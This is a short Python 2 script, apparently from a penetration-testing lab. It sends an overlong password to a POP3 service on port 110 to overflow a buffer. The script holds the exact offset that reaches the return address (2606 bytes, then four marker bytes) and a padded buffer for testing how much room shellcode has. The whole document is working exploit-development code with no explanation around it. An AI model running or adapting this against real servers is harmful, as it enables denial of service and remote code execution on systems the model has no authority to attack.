#!/usr/bin/python
import socket, sys
from time import sleep

#Buffer of exact lenght to overflow
#Buffer="A"*2606+"B"*4+"C"*92

#Buffer to test length for shellcode
Buffer="A"*2606+"B"*4+"C"*(3500-2606-4)

#UN=raw_input("Enter A username: ")	
#target=raw_input("Enter Target IP: ")	
#Tport=raw_input("Enter Target Port: ")
	
UN='username'
target='10.11.20.153'
Tport=110

try:	
	print "Sending Offset of size %s"% str(len(Buffer))
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect=s.connect((target,Tport))
	s.recv(1024)
	#command to send with param we are trying to overflow
	s.send('USER '+UN+'\r\n')
	s.recv(1024)
	s.send('PASS '+Buffer+'\r\n')
	s.send('QUIT')	
	s.close()
	sleep(1)
		
except:
	print "Buffer Sent..Crashed?"
	sys.exit()
